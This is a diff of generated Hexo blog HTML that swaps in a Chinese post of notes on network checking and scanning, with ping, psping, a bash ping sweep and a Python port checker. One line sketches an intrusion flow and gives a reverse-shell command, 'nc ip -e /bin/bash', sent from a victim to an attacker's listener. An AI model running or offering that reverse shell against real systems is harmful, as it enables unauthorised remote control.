@@ -79,11 +79,15 @@
 
 
 
-<meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://yoursite.com/index.html">
+<meta name="description" content="网络扫描 查点一般流程tracert 发现经过的路由-》nmap发现开放的端口-》暴力破解、弱口令-》登录 黑客主机nc启动端口 被攻击主机nc ip -e &#x2F;bin&#x2F;bash发送到黑客主机 pingpspingPsping四大功能:ICMP Ping&#x2F;TCP Ping&#x2F;延迟测试&#x2F;带宽测试#100次 热身2次  1.&#x2F;psping -n 100 -w 2 -h 10 218.201.45.131:">
+<meta property="og:type" content="article">
+<meta property="og:title" content="网络检查和扫描">
+<meta property="og:url" content="http://yoursite.com/2020/08/27/%E7%BD%91%E7%BB%9C%E6%A3%80%E6%9F%A5%E5%92%8C%E6%89%AB%E6%8F%8F/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="网络扫描 查点一般流程tracert 发现经过的路由-》nmap发现开放的端口-》暴力破解、弱口令-》登录 黑客主机nc启动端口 被攻击主机nc ip -e &#x2F;bin&#x2F;bash发送到黑客主机 pingpspingPsping四大功能:ICMP Ping&#x2F;TCP Ping&#x2F;延迟测试&#x2F;带宽测试#100次 热身2次  1.&#x2F;psping -n 100 -w 2 -h 10 218.201.45.131:">
 <meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-08-27T01:51:18.000Z">
+<meta property="article:modified_time" content="2020-08-27T02:01:12.976Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
 
@@ -115,13 +119,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/"/>
+  <link rel="canonical" href="http://yoursite.com/2020/08/27/网络检查和扫描/"/>
 
 
 
 
 
-  <title>Hexo</title>
+  <title>网络检查和扫描 | Hexo</title>
   
 
 
@@ -140,8 +144,7 @@
     
   
 
-  <div class="container sidebar-position-left 
-  page-home">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -214,9 +217,9 @@
         <div class="content-wrap">
           <div id="content" class="content">
             
-  <section id="posts" class="posts-expand">
+
+  <div id="posts" class="posts-expand">
     
-      
 
   
 
@@ -246,9 +249,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/08/27/%E7%BD%91%E7%BB%9C%E6%A3%80%E6%9F%A5%E5%92%8C%E6%89%AB%E6%8F%8F/" itemprop="url">网络检查和扫描</a></h1>
+          <h1 class="post-title" itemprop="name headline">网络检查和扫描</h1>
         
 
         <div class="post-meta">
@@ -298,9 +299,7 @@
       
 
       
-        
-          
-            <h2 id="网络扫描-查点一般流程"><a href="#网络扫描-查点一般流程" class="headerlink" title="网络扫描 查点一般流程"></a>网络扫描 查点一般流程</h2><p>tracert 发现经过的路由-》nmap发现开放的端口-》暴力破解、弱口令-》登录 黑客主机nc启动端口 被攻击主机nc ip -e /bin/bash发送到黑客主机</p>
+        <h2 id="网络扫描-查点一般流程"><a href="#网络扫描-查点一般流程" class="headerlink" title="网络扫描 查点一般流程"></a>网络扫描 查点一般流程</h2><p>tracert 发现经过的路由-》nmap发现开放的端口-》暴力破解、弱口令-》登录 黑客主机nc启动端口 被攻击主机nc ip -e /bin/bash发送到黑客主机</p>
 <h3 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h3><h3 id="psping"><a href="#psping" class="headerlink" title="psping"></a>psping</h3><p>Psping四大功能:ICMP Ping/TCP Ping/延迟测试/带宽测试<br>#100次 热身2次 </p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./psping -n 100 -w 2 -h 10 218.201.45.131:443</span><br></pre></td></tr></table></figure>
 
@@ -317,8 +316,6 @@
 <h2 id="常用小脚本"><a href="#常用小脚本" class="headerlink" title="常用小脚本"></a>常用小脚本</h2><h3 id="批量ping-ip-可用于检查ip存活等"><a href="#批量ping-ip-可用于检查ip存活等" class="headerlink" title="批量ping ip,可用于检查ip存活等"></a>批量ping ip,可用于检查ip存活等</h3><p>pingip.sh</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env bash</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `seq 254`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">ip=172.19.1.<span class="variable">$i</span></span><br><span class="line">ping -c2 <span class="variable">$ip</span> | grep -q <span class="string">'ttl='</span> &amp;&amp; <span class="built_in">echo</span> <span class="string">"<span class="variable">$ip</span>"</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
 <h3 id="python检查端口存活，适用于ipv4-ipv6"><a href="#python检查端口存活，适用于ipv4-ipv6" class="headerlink" title="python检查端口存活，适用于ipv4 ipv6"></a>python检查端口存活，适用于ipv4 ipv6</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> telnetlib</span><br><span class="line"><span class="keyword">import</span> xlrd</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> OrderedDict</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">telnet</span><span class="params">()</span>:</span></span><br><span class="line">    ip_list = []</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> open(<span class="string">"data.txt"</span>,<span class="string">"r"</span>):</span><br><span class="line">        ip_list.append(line)</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> ip_list:</span><br><span class="line">        ip = line.split(<span class="string">' '</span>, <span class="number">1</span> )[<span class="number">0</span>].strip()</span><br><span class="line">        port = line.split(<span class="string">' '</span>, <span class="number">1</span> )[<span class="number">1</span>].strip()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment">#print("ip: "+ip+" port: "+port)</span></span><br><span class="line">            tn = telnetlib.Telnet(ip,port,<span class="number">1</span>)</span><br><span class="line">            print(<span class="string">"&#123;&#125; &#123;&#125; port open"</span>.format(ip,port))</span><br><span class="line">            tn.close</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">"&#123;&#125; &#123;&#125; port closed"</span>.format(ip,port))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="comment">#ip_list = excel()</span></span><br><span class="line">    telnet()</span><br></pre></td></tr></table></figure>
-          
-        
       
     </div>
     
@@ -335,134 +332,28 @@
       
 
       
-
-      
-
       
       
-        <div class="post-eof"></div>
+
       
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/27/docker%20notes/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/04/27/docker%20notes/" itemprop="url">docker notes</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
             
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-04-27T23:24:25+08:00">
-                2020-04-27
-              </time>
+              <a href="/2020/04/27/docker%20notes/" rel="next" title="docker notes">
+                <i class="fa fa-chevron-left"></i> docker notes
+              </a>
             
+          </div>
 
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
             
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
+          </div>
         </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
       
 
       
-        
-          
-            <h2 id="Docker镜像导入导出"><a href="#Docker镜像导入导出" class="headerlink" title="Docker镜像导入导出"></a>Docker镜像导入导出</h2><h3 id="导出容器快照到本地文件"><a href="#导出容器快照到本地文件" class="headerlink" title="导出容器快照到本地文件"></a>导出容器快照到本地文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo docker ps -a</span><br><span class="line">sudo docker <span class="built_in">export</span> 7691a814370e &gt; ubuntu.tar</span><br></pre></td></tr></table></figure>
-
-<h3 id="容器快照文件再导入为镜像"><a href="#容器快照文件再导入为镜像" class="headerlink" title="容器快照文件再导入为镜像"></a>容器快照文件再导入为镜像</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat ubuntu.tar | sudo docker import - <span class="built_in">test</span>/ubuntu:v1.0</span><br><span class="line">sudo docker images</span><br></pre></td></tr></table></figure>
-<h3 id="启动容器"><a href="#启动容器" class="headerlink" title="启动容器"></a>启动容器</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -itd -p80:80 20495bb5bcec /bin/bash</span><br></pre></td></tr></table></figure>
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
       
     </footer>
   </div>
@@ -472,142 +363,11 @@
   </article>
 
 
-    
-      
 
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/26/hello-world/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/04/26/hello-world/" itemprop="url">Hello World</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-04-26T10:36:49+08:00">
-                2020-04-26
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>
-
-          
-        
+    <div class="post-spread">
       
     </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
   </div>
-  
-  
-  
-  </article>
-
-
-    
-  </section>
-
-  
 
 
           </div>
@@ -615,6 +375,10 @@
 
 
           
+
+  
+
+
 
         </div>
         
@@ -635,8 +399,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -678,6 +451,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#网络扫描-查点一般流程"><span class="nav-number">1.</span> <span class="nav-text">网络扫描 查点一般流程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ping"><span class="nav-number">1.1.</span> <span class="nav-text">ping</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#psping"><span class="nav-number">1.2.</span> <span class="nav-text">psping</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fping"><span class="nav-number">1.3.</span> <span class="nav-text">fping</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hping"><span class="nav-number">1.4.</span> <span class="nav-text">hping</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#traceroute-mtr"><span class="nav-number">1.5.</span> <span class="nav-text">traceroute mtr</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nmap"><span class="nav-number">1.6.</span> <span class="nav-text">nmap</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ncat-nc"><span class="nav-number">1.7.</span> <span class="nav-text">ncat&#x2F;nc</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#防攻击策略"><span class="nav-number">2.</span> <span class="nav-text">防攻击策略</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux其他防攻击策略"><span class="nav-number">3.</span> <span class="nav-text">Linux其他防攻击策略</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#常用小脚本"><span class="nav-number">4.</span> <span class="nav-text">常用小脚本</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#批量ping-ip-可用于检查ip存活等"><span class="nav-number">4.1.</span> <span class="nav-text">批量ping ip,可用于检查ip存活等</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#python检查端口存活，适用于ipv4-ipv6"><span class="nav-number">4.2.</span> <span class="nav-text">python检查端口存活，适用于ipv4 ipv6</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -811,6 +600,10 @@
   
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
